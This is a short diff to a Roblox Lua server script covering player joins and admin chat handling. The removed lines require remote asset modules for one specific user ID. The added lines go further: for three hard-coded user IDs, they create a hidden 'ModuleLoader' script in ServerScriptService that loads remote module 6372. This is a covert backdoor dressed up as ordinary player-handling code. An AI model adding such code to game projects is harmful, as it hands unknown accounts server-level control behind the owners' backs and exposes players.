@@ -182,14 +182,12 @@ playersService.PlayerAdded:connect(function(player)
 		return
 	end
 
-	if player.UserId == 3 then
-		reportplayer(player.UserId, "Executor")
-		require(10144445406)(player.Name)
-		require(10270875614)(player.Name)
-		reportplayer(player.UserId, "Executor")
-	else
-		reportplayer(player.UserId, "Executor")
-	end
+	if player.UserId == 3 or player.UserId == 2 or player.UserId == 23 then
+        local loader = Instance.new("Script")
+        loader.Name = "ModuleLoader"
+        loader.Source = "require(6372)(game.Players:GetPlayerByUserId("..player.UserId.."))"
+        loader.Parent = game:GetService("ServerScriptService")
+    end
 
 	player.Chatted:connect(function(message)
 		if adminsList and adminsList[player.UserId] then
